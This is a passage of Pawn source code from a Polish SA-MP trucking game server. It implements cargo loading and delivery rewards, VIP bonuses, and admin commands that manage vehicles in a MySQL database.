				printf("[cargo debug] Gracz %s naczepka %d towar naczepka %d",PlayerName(playerid),cInfo[idcargo][naczepkat],naczepkadoz);
				LoadCargoToTrailer2(playerid,idcargo);
			}
			else
			{
				SendClientMessage(playerid,Szary,"# Ten towar wymaga duzej naczepy!");
			}
		}
	}	


	stock LoadCargoToTrailer2(playerid,idcargo)
	{
		new string[180];
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);
		new cargoname[100];
		if(idcargo != 0)
		{ // Sprawdza czy jest towar
			format(cargoname,sizeof cargoname,"%s",cInfo[idcargo][namet]);

			//new bool:naczepkadoz;
			//if(GetVehicleModel(dllt) == 611) naczepkadoz = true;
			//else naczepkadoz = false;


			if(cInfo[idcargo][vipw] == 1)
			{
				if(PlayerInfo[playerid][VIP] == 1)
				{
					if(PlayerInfo[playerid][Nielegalne] >= cInfo[idcargo][nlg] )
					{
						if(PlayerInfo[playerid][Legalne] >= cInfo[idcargo][lg])
						{

							TextDrawShowForPlayer(playerid,towartd[playerid]);

							printf("[LOGS] Zaladowano UID %d przez %s w naczepie %d",idcargo,PlayerName(playerid),dllt);
							VehicleInfo[dllt][Towar] = idcargo;


							dance:
							new randMagazine = random(LoadedInfo[Magazines]);


							if(randMagazine == 0 || randMagazine == GetPlayerInMagazine(playerid) || randMagazine == 38) // TENIS CLUB
								goto dance;

							VehicleInfo[dllt][ToOrder] = randMagazine;
							SetPlayerMapIcon(playerid,69,MagazineInfo[randMagazine][x],MagazineInfo[randMagazine][y],MagazineInfo[randMagazine][z],53 , 0, MAPICON_GLOBAL);

							format(string,sizeof string,"# Pomyslnie zaladowales {FFFFFF}%s"ZIELONYHEX" ! || Cel: {FFFFFF}%s!",cargoname,MagazineInfo[randMagazine][Name]);
							SendClientMessage(playerid,Zielony,string);

							AddOrder(playerid,PlayerInfo[playerid][UID],idcargo,vehid,dllt);
						}
						else
						{
							format(string,sizeof string,"Ten towar wymaga {FFFFFF}%d"ZIELONYHEX" legalnych towarow!",cInfo[idcargo][lg]);
							SendClientMessage(playerid,Czerwony,string);
						}
					}
					else
					{
						format(string,sizeof string,"Ten towar wymaga {FFFFFF}%d"ZIELONYHEX" nielegalnych towarow!",cInfo[idcargo][nlg]);
						SendClientMessage(playerid,Czerwony,string);
					}
				}
				else
				{
					format(string,sizeof string,"Ten towar wymaga konta {FFFFFF}VIP"ZIELONYHEX"!");
					SendClientMessage(playerid,Czerwony,string);
				}
			}
			else if(cInfo[idcargo][vipw] != 1)
			{


				if(PlayerInfo[playerid][Nielegalne] >= cInfo[idcargo][nlg] )
				{
					if(PlayerInfo[playerid][Legalne] >= cInfo[idcargo][lg])
					{

						TextDrawShowForPlayer(playerid,towartd[playerid]);

						printf("[LOGS] Zaladowano UID %d przez %s w naczepie %d",idcargo,PlayerName(playerid),dllt);
						VehicleInfo[dllt][Towar] = idcargo;

						dance:
						new randMagazine = random(LoadedInfo[Magazines]);


						if(randMagazine == 0 || randMagazine == GetPlayerInMagazine(playerid) || randMagazine == 38)
							goto dance;

						VehicleInfo[dllt][ToOrder] = randMagazine;

						SetPlayerMapIcon(playerid,69,MagazineInfo[randMagazine][x],MagazineInfo[randMagazine][y],MagazineInfo[randMagazine][z],53 , 0, MAPICON_GLOBAL);

						format(string,sizeof string,"# Pomyslnie zaladowales {FFFFFF}%s"ZIELONYHEX" ! || Cel: {FFFFFF}%s!",cargoname,MagazineInfo[randMagazine][Name]);
						SendClientMessage(playerid,Zielony,string);

						AddOrder(playerid,PlayerInfo[playerid][UID],idcargo,vehid,dllt);

					}
					else
					{
						format(string,sizeof string,"# Ten towar wymaga {FFFFFF}%d"ZIELONYHEX" legalnych towarow!",cInfo[idcargo][lg]);
						SendClientMessage(playerid,Zielony,string);
					}
				}
				else
				{
					format(string,sizeof string,"# Ten towar wymaga {FFFFFF}%d"ZIELONYHEX" nielegalnych towarow!",cInfo[idcargo][nlg]);
					SendClientMessage(playerid,Zielony,string);
				}
				//}
			//else
				//{
				//format(string,sizeof string,"# Ten towar wymaga konta {FFFFFF}VIP"ZIELONYHEX"!");
				//SendClientMessage(playerid,Zielony,string);


			}

		}
		else if(idcargo == 0)
		{
			SendClientMessage(playerid,Zielony,"# Nie ma takiego towaru w magazynie!");
		}
	}

	CMD:rozladuj(playerid,params[])
	{
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);


		if(GetPlayerInMagazine(playerid) == 0)
			return SendClientMessage(playerid, Czerwony, "# Nie jestes w zadnym magazynie!");

		if(VehicleInfo[dllt][Towar] <= 0)
			return SendClientMessage(playerid, Czerwony, "# Nie jestes zaladowany!");

		if(PlayerInfo[playerid][Team] == COMPANY_PD || PlayerInfo[playerid][Team] == COMPANY_POLICJA || PlayerInfo[playerid][Team] == COMPANY_POGOTOWIE || PlayerInfo[playerid][Team] == COMPANY_TAXI || PlayerInfo[playerid][Team] == COMPANY_SITA)
			return SendClientMessage(playerid, Czerwony, "# Jestes w frakcji!");

		if(vehid == 0)
			return SendClientMessage(playerid, Czerwony, "# Nie jestes w wozie!");
		if(!IsPlayerInRangeOfPoint(playerid, 10.0, MagazineInfo[VehicleInfo[dllt][ToOrder]][x], MagazineInfo[VehicleInfo[dllt][ToOrder]][y], MagazineInfo[VehicleInfo[dllt][ToOrder]][z]))
			return SendClientMessage(playerid, Szary, "# Nie jestes w docelowym miejscu!");

		new model = GetVehicleModel(vehid);

		if(model == 515 || model == 403 || model == 514 || model == 411)
		{
			if(!IsTrailerAttachedToVehicle(vehid))
				return SendClientMessage(playerid, Zielony, "# Nie masz podczepionej naczepy!");

			new moneykilometrs;
			new mess[300];
			new towar = VehicleInfo[dllt][Towar];
			new moneykm = floatround(VehicleInfo[dllt][KM], floatround_ceil);

			new scorekilometrs;
			new scorekm = floatround(VehicleInfo[dllt][KM], floatround_ceil);
			scorekilometrs = cInfo[towar][scorew] * scorekm;
			if(VehicleInfo[dllt][KM] >= 1)
			{
				moneykilometrs = cInfo[towar][moneyw] * moneykm;
				new moneykilometrs2;
				if(PlayerInfo[playerid][VIP] != 1) moneykilometrs2 = moneykilometrs*3;
				if(PlayerInfo[playerid][VIP] == 1) moneykilometrs2 = moneykilometrs*5;

				if(GetVehicleModel(dllt) == 611) 
				{
					moneykilometrs2 = moneykilometrs2/4*3;
					format(mess,sizeof mess,"* Wynagrodzenie w dolarach (naczepka): "BIALYHEX"$%d"ZIELONYHEX" *",moneykilometrs2);
				}
				else
				{
					format(mess,sizeof mess,"* Wynagrodzenie w dolarach: "BIALYHEX"$%d"ZIELONYHEX" *",moneykilometrs2);
				}



				SendClientMessage(playerid,Zielony,mess);


				GiveMoneyEx(playerid,moneykilometrs2);



				format(mess,sizeof mess,"* Wynagrodzenie w punktach: "BIALYHEX"%d pkt. "ZIELONYHEX"*",scorekilometrs*2);

				SendClientMessage(playerid,Zielony,mess);
				GiveScoreEx(playerid,GetScoreEx(playerid)+scorekilometrs*2);


				if(BonusCargo == true)
				{
					format(mess,sizeof mess,"# HappyWorld bonus: "BIALYHEX"$%d "ZIELONYHEX"i"BIALYHEX" %d score",moneykilometrs2/2,scorekilometrs);
					SendClientMessage(playerid,Zielony,mess);
					GiveMoneyEx(playerid,moneykilometrs2/2);
					GiveScoreEx(playerid,GetScoreEx(playerid)+scorekilometrs);
					Earned(playerid,moneykilometrs2/2,"Bonus HW rozladowania");
				}

				if(PlayerInfo[playerid][Team] >= 1)
				{
				Earned(playerid,moneykilometrs2,"Rozladowanie towaru");
				}	



			}
			SaveOrders();
			RemovePlayerMapIcon(playerid,69);
			if(cInfo[towar][legalt] && VehicleInfo[dllt][KM] >= 2)
			{
				new kmnormal = floatround(VehicleInfo[dllt][KM],floatround_ceil);
				new liczbalg = kmnormal;
				format(mess,sizeof mess,"* Otrzymales: "BIALYHEX"%d legalnych towarow! "ZIELONYHEX"*",liczbalg);
				PlayerInfo[playerid][Legalne] += liczbalg;
			}
			else if(cInfo[towar][nolegalt] && VehicleInfo[dllt][KM] >= 2)
			{
				new kmnormal = floatround(VehicleInfo[dllt][KM],floatround_ceil);
				new liczbanlg = kmnormal;
				format(mess,sizeof mess,"* Otrzymales: "BIALYHEX"%d nielegalnych towarow! "ZIELONYHEX"*",liczbanlg);
				PlayerInfo[playerid][Nielegalne] += liczbanlg;
			}

			if(VehicleInfo[dllt][KM] < 2)
			{
				format(mess,sizeof mess,"* Twoj dystans towaru nie spelnial warunkow na towary lg/nlg. *");
			}

			SendClientMessage(playerid,Zielony,mess);
			RemoveOrder(PlayerInfo[playerid][UID],dllt);

			if(VehicleInfo[dllt][KM] >= 100)
			{
				format(mess,sizeof mess,"# Gracz %s rozladowal towar z przebiegiem {FFFFFF}%0.2f km"ZIELONYHEX"! Gratulacje!",Player(playerid),VehicleInfo[dllt][KM]);
				SendClientMessageToAll(Zielony,mess);
				SendClientMessage(playerid,Zielony,"* Premia za dlugi dystans towaru: {FFFFFF}2000$ i 100 score"ZIELONYHEX" Gratulacje! *");
				GiveMoneyEx(playerid,2000);
				GiveScoreEx(playerid,GetScoreEx(playerid)+100);
				Earned(playerid,1000,"Bonus >=100km towaru");
			}



			


			if(VehicleInfo[dllt][KM] >= 1)
			{
				SprawdzOsiagniecie(playerid,1);
			}
			if(GetMoneyEx(playerid) >= 100000)
			{
				SprawdzOsiagniecie(playerid,2);
			}


			if(VehicleInfo[dllt][KM] >= 100)
			{
				SprawdzOsiagniecie(playerid,4);
			}
			VehicleInfo[dllt][KM] = 0.00;
			VehicleInfo[dllt][Towar] = 0;
			TextDrawSetString(towartd[playerid]," ");
			TextDrawHideForPlayer(playerid,towartd[playerid]);
 // Copyright (c) 2014-2015 KapiziaK

		}


		return 1;
	}

	//DOSTAWCZAKI


	CMD:zapakuj(playerid,params[])
	{
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);

		if(GetPlayerInMagazine(playerid) == 0)
			return SendClientMessage(playerid, Zielony, "# Nie jestes w zadnym magazynie!");

		if(VehicleInfo[dllt][Towar] >= 1)
			return SendClientMessage(playerid, Zielony, "# Ten pojazd/naczepa ma juz towar!");

		if(PlayerInfo[playerid][Team] == COMPANY_PD || PlayerInfo[playerid][Team] == COMPANY_POLICJA || PlayerInfo[playerid][Team] == COMPANY_POGOTOWIE || PlayerInfo[playerid][Team] == COMPANY_TAXI || PlayerInfo[playerid][Team] == COMPANY_SITA)
			return SendClientMessage(playerid, Zielony, "# Jestes w frakcji!");

		if(vehid == 0)
			return SendClientMessage(playerid, Zielony, "# Nie jestes w wozie!");

		new model = GetVehicleModel(vehid);

		if(model == 403 || model == 482 || model == 413 || model == 609)
		{
			//if(!IsTrailerAttachedToVehicle(vehid))
				//return SendClientMessage(playerid, Zielony, "# Nie masz podczepionej naczepy!");


			ShowPlayerDialog(playerid, 701, DIALOG_STYLE_LIST, "Wybierz Towar", "Zboza\nWarzywa i owoce\nZwierzeta hodowlane\nInne", "Wybierz","Anuluj");


		}
		else
			return SendClientMessage(playerid, Zielony, "# Nie masz odpowiedniego wozu!");

		return 1;
	}

	CMD:wypakuj(playerid,params[])
	{
		new vehid = GetPlayerVehicleID(playerid);
		new modelt = GetVehicleTrailer(vehid);
		new dllt = GetVehicleIDTrailer(playerid,vehid,modelt);



		if(GetPlayerInMagazine(playerid) == 0)
			return SendClientMessage(playerid, Zielony, "# Nie jestes w zadnym magazynie!");

		if(VehicleInfo[dllt][Towar] <= 0)
			return SendClientMessage(playerid, Zielony, "# Nie jestes zaladowany!");

		if(PlayerInfo[playerid][Team] == COMPANY_PD || PlayerInfo[playerid][Team] == COMPANY_POLICJA || PlayerInfo[playerid][Team] == COMPANY_POGOTOWIE || PlayerInfo[playerid][Team] == COMPANY_TAXI || PlayerInfo[playerid][Team] == COMPANY_SITA)
			return SendClientMessage(playerid, Zielony, "# Jestes w frakcji!");


		if(vehid == 0)
			return SendClientMessage(playerid, Zielony, "# Nie jestes w wozie!");

		new model = GetVehicleModel(vehid);


		if(model == 403 || model == 482 || model == 413 || model == 609)
		{
			//if(!IsTrailerAttachedToVehicle(vehid))
				//return SendClientMessage(playerid, Zielony, "# Nie masz podczepionej naczepy!");

			new moneykilometrs;
			new mess[300];
			new towar = VehicleInfo[dllt][Towar];
			new moneykm = floatround(VehicleInfo[dllt][KM],floatround_ceil);
			new scorekilometrs;
			new scorekm = floatround(VehicleInfo[dllt][KM],floatround_ceil);
			scorekilometrs = cInfo[towar][scorew] * scorekm/2;
			if(VehicleInfo[dllt][KM] >= 1)
			{
				moneykilometrs = cInfo[towar][moneyw] * moneykm/2;
				format(mess,sizeof mess,"* Wynagrodzenie w dolarach: "BIALYHEX"$%d"ZIELONYHEX" *",moneykilometrs/2);



				SendClientMessage(playerid,Zielony,mess);

				GiveMoneyEx(playerid,moneykilometrs/2);




				format(mess,sizeof mess,"* Wynagrodzenie w punktach: "BIALYHEX"%d pkt. "ZIELONYHEX"*",scorekilometrs/2);

				SendClientMessage(playerid,Zielony,mess);
				GiveScoreEx(playerid,GetScoreEx(playerid)+scorekilometrs/2);
			}
			SaveOrders();
			RemovePlayerMapIcon(playerid,69);

			if(cInfo[towar][legalt] && VehicleInfo[dllt][KM] >= 2)
			{
				new kmnormal = floatround(VehicleInfo[dllt][KM],floatround_ceil);
				new liczbalg = kmnormal/4;
				format(mess,sizeof mess,"* Otrzymales: "BIALYHEX"%d legalnych towarow! "ZIELONYHEX"*",liczbalg);
				PlayerInfo[playerid][Legalne] += liczbalg;
			}
			else if(cInfo[towar][nolegalt] && VehicleInfo[dllt][KM] >= 2)
			{
				new kmnormal = floatround(VehicleInfo[dllt][KM],floatround_ceil);
				new liczbanlg = kmnormal/4;
				format(mess,sizeof mess,"* Otrzymales: "BIALYHEX"%d nielegalnych towarow! "ZIELONYHEX"*",liczbanlg);
				PlayerInfo[playerid][Nielegalne] += liczbanlg;
			}

			if(VehicleInfo[dllt][KM] < 2)
			{
				format(mess,sizeof mess,"* Twoj dystans towaru nie spelnial warunkow na towary lg/nlg. *");
			}

			SendClientMessage(playerid,Zielony,mess);
			RemoveOrder(PlayerInfo[playerid][UID],dllt);

			if(VehicleInfo[dllt][KM] >= 80)
			{
				format(mess,sizeof mess,"# Gracz %s rozladowal towar z przebiegiem {FFFFFF}%0.2f km"ZIELONYHEX"! Gratulacje!",Player(playerid),VehicleInfo[dllt][KM]);
				SendClientMessageToAll(Zielony,mess);
				SendClientMessage(playerid,Zielony,"* Premia za dlugi dystans towaru: {FFFFFF}400$ i 8 score"ZIELONYHEX" Gratulacje! *");
				GiveMoneyEx(playerid,2000);
				GiveScoreEx(playerid,GetScoreEx(playerid)+200);
			}

			if(PlayerInfo[playerid][VIP] == 1 && VehicleInfo[dllt][KM] >= 1)
			{
				SendClientMessage(playerid,Zielony,"* Dodatkowa premia za konto premium:");
				scorekilometrs = cInfo[towar][scorew] * scorekm/2;
				format(mess,sizeof mess,"* Wynagrodzenie w punktach: "BIALYHEX"%d pkt. "ZIELONYHEX"*",scorekilometrs);
				moneykilometrs = cInfo[towar][moneyw] * moneykm/2;
				format(mess,sizeof mess,"* Wynagrodzenie w dolarach: "BIALYHEX"$%d"ZIELONYHEX" *",moneykilometrs);

			}
			if(VehicleInfo[dllt][KM] >= 1)
			{
				SprawdzOsiagniecie(playerid,1);
			}
			if(GetMoneyEx(playerid) >= 100000)
			{
				SprawdzOsiagniecie(playerid,2);
			}

			if(PlayerInfo[playerid][Team] >= 1)
			{
				Earned(playerid,moneykilometrs/2,"Rozladowanie towaru");
			}
			if(VehicleInfo[dllt][KM] >= 100)
			{
				SprawdzOsiagniecie(playerid,4);
			}

			VehicleInfo[dllt][KM] = 0.00;
			VehicleInfo[dllt][Towar] = 0;
			TextDrawSetString(towartd[playerid]," ");
			TextDrawHideForPlayer(playerid,towartd[playerid]);


		}


		return 1;
	}



	CMD:car_paliwo(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new vehicleidd = GetPlayerVehicleID(playerid);



		if(vehicleidd != 0)
		{
			VehicleInfo[vehicleidd][Paliwo] = 300;
		}
		return 1;

	}


	CMD:car_quit(playerid,params[])
	{
		//if(GraczWpisalZW[playerid] == 1)
		//return 0;

		RemovePlayerFromVehicle(playerid);
		TogglePlayerControllable(playerid,1);
		return 1;

	}

	CMD:car_new(playerid,params[])
	{
		new owner[25];
		new buffer[500];
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		if(!strcmp(owner,"Brak",false))
		{
			new vehicleidd;
			new Float:X, Float:Y, Float:Z;
			GetPlayerPos(playerid, X, Y, Z);
			vehicleidd = AddStaticVehicleEx(567, X+4, Y, Z, 0, 3, 3, 100);
			format(buffer,sizeof buffer,"INSERT INTO `vehicles` (`owner`, `model`, `price`, `x`, `y`, `z`, `a`,`color1`,`color2`) VALUES ('Brak','567','%d','%0.2f','%0.2f','%0.2f','%0.2f','3','3')",70000,X+4,Y,Z,0.0);
			mysql_query(buffer);
			LoadedInfo[Vehicles]++;
			format(VehicleInfo[vehicleidd][Owner],25,"Brak");
			SetVehicleNumberPlate(vehicleidd, "Publiczny");
			VehicleInfo[vehicleidd][Model] = 567;
			VehicleInfo[vehicleidd][Pos][xa] = X+4;
			VehicleInfo[vehicleidd][Pos][ya] = Y;
			VehicleInfo[vehicleidd][Pos][za] = Z;
			VehicleInfo[vehicleidd][Pos][aa] = 0.0;
			VehicleInfo[vehicleidd][Olej] = 10;
			//ehicleInfo[]
			SetVehicleToRespawn(vehicleidd);
			new vehicleid = vehicleidd;
			format(buffer,sizeof buffer,"SELECT `id` FROM `vehicles` ORDER BY `id` DESC LIMIT 1");

			if(mysql_query(buffer))
				mysql_ping();

			if(GetVehicleModel(vehicleid) == 578)
			{

				objveh[vehicleid][0] = CreateObject(983, 0, 0, 0, 0, 0, 0);
				objveh[vehicleid][1] = CreateObject(983, 0, 0, 0, 0, 0, 0);
				objveh[vehicleid][2] = CreateObject(983, 0, 0, 0, 0, 0, 0);
				objveh[vehicleid][3] = CreateObject(983, 0, 0, 0, 0, 0, 0);
				objveh[vehicleid][4] = CreateObject(11474, 0, 0, 0, 0, 0, 0); 
				AttachObjectToVehicle(objveh[vehicleid][0], vehicleid, 1.4550000429153, -0.85600000619888, 0.41100001335144, 0, 0, 0);
				AttachObjectToVehicle(objveh[vehicleid][1], vehicleid, 1.4490000009537, -2.4389998912811, 0.41100001335144, 0, 0, 0);
				AttachObjectToVehicle(objveh[vehicleid][2], vehicleid, -1.460000038147, -0.86400002241135, 0.41100001335144, 0, 0, 0);
				AttachObjectToVehicle(objveh[vehicleid][3], vehicleid, -1.4609999656677, -2.4519999027252, 0.41100001335144, 0, 0, 0);
				AttachObjectToVehicle(objveh[vehicleid][4], vehicleid, -0.068000003695488, -5.7540001869202, 0.38100001215935, 0, 2.5, 5.5);
				opendoor[vehicleid] = false;
			}


			mysql_store_result();
			mysql_fetch_row(buffer,"|");
			sscanf(buffer,"p<|>d",VehicleInfo[vehicleidd][UID]);
			mysql_free_result();
		}
		AddLog(PlayerName(playerid),"Stworzyl nowy woz");
		return 1;
	}
	CMD:car_type(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);
		new buffer[300];
		new carid = strval(params);
		new vehicleidd;
		if(isnull(params)) return SendClientMessage(playerid, Szary, "Uzyj: "BIALYHEX" /car_type [id pojazdu]");

		if(carid < 400 || carid > 611)
		{
			SendClientMessage(playerid, Szary, "# Id pojazdu nieprawidlowe. Id pojazdu powinno byc od 400 do 611");
			return 1;
		}

		vehicleidd = GetPlayerVehicleID(playerid);
		if(vehicleidd == 0)
			return SendClientMessage(playerid, Szary, "# Nie siedzisz w pojezdzie!");

		format(buffer,sizeof buffer,"UPDATE `vehicles` SET `model`='%d' WHERE id='%d'",carid,VehicleInfo[vehicleidd][UID]);
		mysql_query(buffer);

		SetVehicleToRespawn(vehicleidd);
		VehicleInfo[vehicleidd][Model] = carid;
		DestroyVehicle(vehicleidd);

		AddStaticVehicleEx(carid, VehicleInfo[vehicleidd][Pos][xa], VehicleInfo[vehicleidd][Pos][ya], VehicleInfo[vehicleidd][Pos][za], VehicleInfo[vehicleidd][Pos][aa], 3, 3, 100);




		AddLog(PlayerName(playerid),"Zmienil MODEL auta");
		return 1;
	}
	CMD:car_del(playerid,params[])
	{

		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid, Zielony, "# Uzyj: "BIALYHEX"/car_del [ID z DLL]");

		//DestroyVehicle(id);
		new uidveh = VehicleInfo[id][UID];

		new query[150];
		format(query,sizeof query,"DELETE FROM `vehicles` WHERE `id` = '%d'",uidveh);
		mysql_query(query);
		//LoadedInfo[Vehicles];

		SetVehicleVirtualWorld(id, 69);

		AddLog(PlayerName(playerid),"Usunal woz!");

		return 1;

	}

	CMD:car_cena(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new priceing;

		if(sscanf(params, "d", priceing))
			return SendClientMessage(playerid, JasnyCzerwony, "/car_cena [ CENA POJAZDU ]");

		new vehicleidd = GetPlayerVehicleID(playerid);


		if(priceing < 0)
		{
			return SendClientMessage(playerid, JasnyCzerwony, "Zla wartosc CENA!");
		}


		if(vehicleidd != 0)
		{
			new buffer[300];
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `price`='%d' WHERE id='%d'",priceing,VehicleInfo[vehicleidd][UID]);
			mysql_query(buffer);
			printf("[ADMIN LOG] %s ustawil wartosc CENA u auta %d na : %d",Player(playerid),VehicleInfo[vehicleidd][UID],priceing);
			SendClientMessage(playerid,Zielony,"# Wartosc CENA tego auta zostala poprawnie zmieniona!");
			VehicleInfo[vehicleidd][Price] = priceing;
			//VehicleInfo[vehicleidd][Rynkowa] = priceing;
			format(logstring,sizeof logstring,"Zmienil wartosc CENA pojazdu %d na $%d",VehicleInfo[vehicleidd][UID],priceing);
			AddLog(PlayerName(playerid),logstring);
			if(VehicleInfo[vehicleidd][sell] == 1)
			{
				Delete3DTextLabel(sell3d[vehicleidd]);
				new string[150];
				format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[vehicleidd][Price]);
				sell3d[vehicleidd] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
				Attach3DTextLabelToVehicle(sell3d[vehicleidd], vehicleidd, 0.0, 0.0, 0.0);
			}

		}

		return 1;
	}



	CMD:car_price(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new priceing;

		if(sscanf(params, "d", priceing))
			return SendClientMessage(playerid, JasnyCzerwony, "/car_price [ CENA POJAZDU ]");

		new vehicleidd = GetPlayerVehicleID(playerid);


		if(priceing < 0)
		{
			return SendClientMessage(playerid, JasnyCzerwony, "Zla wartosc PRICE!");
		}


		if(vehicleidd != 0)
		{
			new buffer[300];
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `price`='%d',`Rynkowa` = '%d' WHERE id='%d'",priceing,priceing,VehicleInfo[vehicleidd][UID]);
			mysql_query(buffer);
			printf("[ADMIN LOG] %s ustawil wartosc price u auta %d na : %d",Player(playerid),VehicleInfo[vehicleidd][UID],priceing);
			SendClientMessage(playerid,Zielony,"# Wartosc PRICE tego auta zostala poprawnie zmieniona!");
			VehicleInfo[vehicleidd][Price] = priceing;
			VehicleInfo[vehicleidd][Rynkowa] = priceing;
			format(logstring,sizeof logstring,"Zmienil wartosc pojazdu %d na $%d",VehicleInfo[vehicleidd][UID],priceing);
			AddLog(PlayerName(playerid),logstring);
			if(VehicleInfo[vehicleidd][sell] == 1)
			{
				Delete3DTextLabel(sell3d[vehicleidd]);
				new string[150];
				format(string,sizeof string,"Pojazd jest na sprzedaz:\n{FFFFFF}$%d",VehicleInfo[vehicleidd][Price]);
				sell3d[vehicleidd] = Create3DTextLabel(string, 0x00CC00FF, 0.0,0.0,0.0, 100.0, 0);
				Attach3DTextLabelToVehicle(sell3d[vehicleidd], vehicleidd, 0.0, 0.0, 0.0);
			}

		}

		return 1;
	}


	CMD:car_reload(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new priceing;

		if(sscanf(params, "d", priceing))
			return SendClientMessage(playerid, JasnyCzerwony, "/car_reload [ID WOZU]");

		new vehicleidd = priceing;
		new id=priceing;

		if(priceing < 0)
		{
			return SendClientMessage(playerid, JasnyCzerwony, "Zla wartosc WOZU!");
		}


		if(vehicleidd != 0)
		{
			DestroyVehicle(id);
			new buffer[300];
			format(buffer, sizeof(buffer), "SELECT `id`,`owner`,`model`,`price`,`x`,`y`,`z`,`a`,`sell`,`team`,`color1`,`color2` FROM `vehicles` WHERE id='%d'",VehicleInfo[id][UID]);
			mysql_query(buffer);
			mysql_store_result();
			mysql_fetch_row(buffer,"|");
			sscanf(buffer, "p<|>ds[25]ddffffdddd",VehicleInfo[id][UID],VehicleInfo[id][Owner],VehicleInfo[id][Model],VehicleInfo[id][Price],VehicleInfo[id][Pos][xa],VehicleInfo[id][Pos][ya],VehicleInfo[id][Pos][za],VehicleInfo[id][Pos][aa],VehicleInfo[id][sell],VehicleInfo[id][TeamCar],VehicleInfo[id][Color1],VehicleInfo[id][Color2]);
			AddStaticVehicleEx(VehicleInfo[id][Model],VehicleInfo[id][Pos][xa],VehicleInfo[id][Pos][ya],VehicleInfo[id][Pos][za],VehicleInfo[id][Pos][aa],VehicleInfo[id][Color1],VehicleInfo[id][Color2],999999);
			mysql_free_result();
			format(logstring,sizeof logstring,"Przeladowal pojazd %d",VehicleInfo[id][UID]);
			AddLog(PlayerName(playerid),logstring);
		}

		return 1;
	}
	/*
	dcmd_car_reload_all(playerid, params[])
	{
		#pragma unused params
		if(IsPlayerAdminek[playerid] <= 4)
			return SendClientMessage(playerid, Zolty, "Brak odpowiednich uprawnien do kozystania z tej komendy");

		new i=0;
		while(LoadedInfo[Vehicles])
		{
			i++;
			DestroyVehicle(i);
		}


		return 1;
	}

	*/

	CMD:autor(playerid,params[])
	{
		SendClientMessage(playerid,Zielony,"# Autor gamemode KapiziaK -- GG:39831273! Wszelkie prawa zmiany tej wiadomosci zastrzezone!");

		return 1;
	}

	CMD:car_owner(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 3)
			return BrakAdmina(playerid,4);

		new ownering[25];

		if(sscanf(params, "s[25]", ownering))
			return SendClientMessage(playerid, JasnyCzerwony, "/car_owner [ NICK WLASCICIELA ]");

		new vehicleidd = GetPlayerVehicleID(playerid);



		if(vehicleidd != 0)
		{
			new buffer[300];
			format(buffer,sizeof buffer,"UPDATE `vehicles` SET `owner`='%s' WHERE id='%d'",ownering,VehicleInfo[vehicleidd][UID]);
			mysql_query(buffer);
			printf("[ADMIN LOG] %s ustawil wartosc owner u auta %d na : %s",Player(playerid),VehicleInfo[vehicleidd][UID],ownering);
			SendClientMessage(playerid,Zielony,"Wlasciciel tego pojazdu zostal zmieniony!");
			VehicleInfo[vehicleidd][Owner] = ownering;
			SetVehicleNumberPlate(vehicleidd, VehicleInfo[vehicleidd][Owner]);
			SetVehicleToRespawn(vehicleidd);
			format(logstring,sizeof logstring,"Zmienil wlasciciela veh %d na %s",VehicleInfo[vehicleidd][UID],ownering);
			AddLog(PlayerName(playerid),logstring);
		}

		return 1;
	}


	CMD:car_reset(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);


		new vehicleidd = GetPlayerVehicleID(playerid);



		if(vehicleidd != 0)
		{

			SendClientMessage(playerid,Zielony,"Pomyslnie zresetowales pojazd!");
			VehicleInfo[vehicleidd][Paliwo] = 350;
			VehicleInfo[vehicleidd][Przebieg] = 0.00;
			VehicleInfo[vehicleidd][Olej] = 10;
			//SetVehicleToRespawn(vehicleidd);
		}

		return 1;
	}

	CMD:car_go(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new idgo;

		if(sscanf(params, "d", idgo))
			return SendClientMessage(playerid, JasnyCzerwony, "/car_go [ID POJAZDU]");

		new Float:xgo,Float:ygo,Float:zgo;

		if(GetVehicleModel(idgo) <= 399 && GetVehicleModel(idgo) >= 615)
			return SendClientMessage(playerid, JasnyCzerwony, "Ten pojazd nie istnieje!");

		GetVehiclePos(idgo,xgo,ygo,zgo);
		SetPlayerPos(playerid,xgo,ygo+3,zgo);

		return 1;
	}

	CMD:car_color(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new colorcmd1,colorcmd2;

		if(sscanf(params, "dd", colorcmd1,colorcmd2))
			return SendClientMessage(playerid, JasnyCzerwony, "/car_color [Kolor Pierwszy] [Kolor Drugi]");


		if(colorcmd1 < 0 && colorcmd1 >= 256)
			return SendClientMessage(playerid, JasnyCzerwony, "Ten kolor nr1 nie istnieje!");

		if(colorcmd2 < 0 && colorcmd2 >= 256)
			return SendClientMessage(playerid, JasnyCzerwony, "Ten kolor nr2 nie istnieje!");

		new vehicleid = GetPlayerVehicleID(playerid);

		if(vehicleid != 0)
		{

			new query[150];
